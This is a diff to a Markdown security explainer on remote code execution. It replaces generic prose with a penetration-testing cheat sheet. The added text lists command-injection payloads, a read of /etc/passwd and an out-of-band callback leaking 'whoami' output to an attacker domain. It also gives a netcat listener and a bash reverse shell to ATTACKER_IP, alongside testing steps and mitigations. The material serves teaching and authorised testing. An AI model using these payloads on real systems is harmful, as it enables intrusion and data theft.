@@ -1,34 +1,74 @@
 # What is RCE?
-Remote Code Execution (RCE) is a type of security vulnerability that allows an attacker to execute arbitrary code on a target system or application remotely. This means that the attacker can run commands, upload and execute malicious software, or take control of the system without being physically present.
 
-## How Does RCE Work?
-- Vulnerability Exploitation: Attackers exploit vulnerabilities in software, applications, or network protocols to gain unauthorized access to a target system.
+Remote Code Execution (RCE) lets an attacker run their own commands or code on a target server. It is the top prize in most engagements because it usually means full control of the host. RCE often chains from something smaller - a file upload, a deserialization bug, or command injection in a shell call.
 
-- Code Injection: Once the vulnerability is exploited, attackers inject their own code or commands into the target system.
+## Common sources
 
-- Execution: The injected code or commands are executed by the system, allowing attackers to perform malicious activities such as stealing data, modifying system configurations, or launching further attacks.
+- **OS command injection** - user input passed to a shell (`system()`, `exec()`, backticks)
+- **Code injection** - input reaches `eval()` or a template engine
+- **Insecure deserialization** - crafted objects trigger gadget chains
+- **File upload + include** - upload a web shell, then request it
 
-## Example Scenario
-Imagine a web application that allows users to upload files. If the application fails to properly validate uploaded files, an attacker could upload a file containing malicious code, such as a PHP script. When the server processes the uploaded file, it executes the malicious code, giving the attacker remote access to the server.
+## Test payloads
 
-## Impact of RCE
-- System Compromise: Attackers can gain full control over the target system, allowing them to steal data, install malware, or modify system configurations.
+```bash
+# Command injection separators
+; id
+| id
+& id
+`id`
+$(id)
 
-- Data Breach: RCE vulnerabilities can lead to unauthorized access to sensitive data stored on the target system, potentially exposing personal information, financial records, or intellectual property.
+# Break out then chain
+127.0.0.1; cat /etc/passwd
+127.0.0.1 && whoami
 
-- Disruption of Services: Attackers may disrupt critical services or operations by executing commands that cause system crashes, denial-of-service attacks, or data loss.
+# Blind - confirm with a delay or an out-of-band ping
+; sleep 5
+; nslookup $(whoami).attacker.oastify.com
+```
 
-## Mitigating RCE
-- Patch and Update: Keep software, applications, and operating systems up-to-date with the latest security patches to mitigate known vulnerabilities.
+## Tools
 
-- Input Validation: Implement strict input validation and sanitization mechanisms to prevent code injection attacks, such as filtering out potentially malicious characters or encoding user input.
+- [Burp Suite Collaborator](https://portswigger.net/burp) - catch blind/out-of-band callbacks
+- [interactsh](https://github.com/projectdiscovery/interactsh) - open-source OAST server
+- [commix](https://github.com/commixproject/commix) - automated command injection
 
-- Least Privilege: Restrict user privileges and limit the execution of code to only what is necessary for the application's functionality, reducing the impact of successful RCE attacks.
+## Getting a shell
 
-- Firewalls and Intrusion Detection Systems (IDS): Deploy firewalls and IDS to monitor network traffic and detect suspicious activities indicative of RCE attempts.
+```bash
+# Listener on your box
+nc -lvnp 4444
 
-## Conclusion
-RCE is a severe security vulnerability that can lead to unauthorized access, data breaches, and system compromise. By understanding how RCE works and implementing appropriate security measures such as patching vulnerabilities, input validation, and least privilege principles, organizations can mitigate the risk of exploitation and protect their systems from malicious actors. Regular security assessments, updates, and proactive monitoring are essential for maintaining a secure and resilient infrastructure.
+# Reverse shell payload to inject
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
 
+# Upgrade to a proper TTY
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
 
+## Manual testing
 
+1. Find any input that reaches a system call, template, or deserializer
+2. Inject a separator and a harmless command like `id`
+3. If nothing reflects, go blind: use `sleep` or an OAST callback
+4. Confirm execution context (`whoami`, `hostname`)
+5. Escalate to a reverse shell only within scope
+
+## Mitigation
+
+- Never pass user input to a shell; use language APIs with argument arrays
+- Avoid `eval` and dynamic code loading on untrusted data
+- Patch known-vulnerable libraries (deserialization gadgets)
+- Run services as a low-privilege user; sandbox with containers/seccomp
+- Egress-filter the server so reverse shells cannot dial out
+
+## Deep dive
+
+- [RCE - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
+- [PortSwigger OS command injection labs](https://portswigger.net/web-security/os-command-injection)
+
+## CWE
+
+- CWE-94: Improper Control of Generation of Code
+- CWE-78: Improper Neutralization of Special Elements used in an OS Command
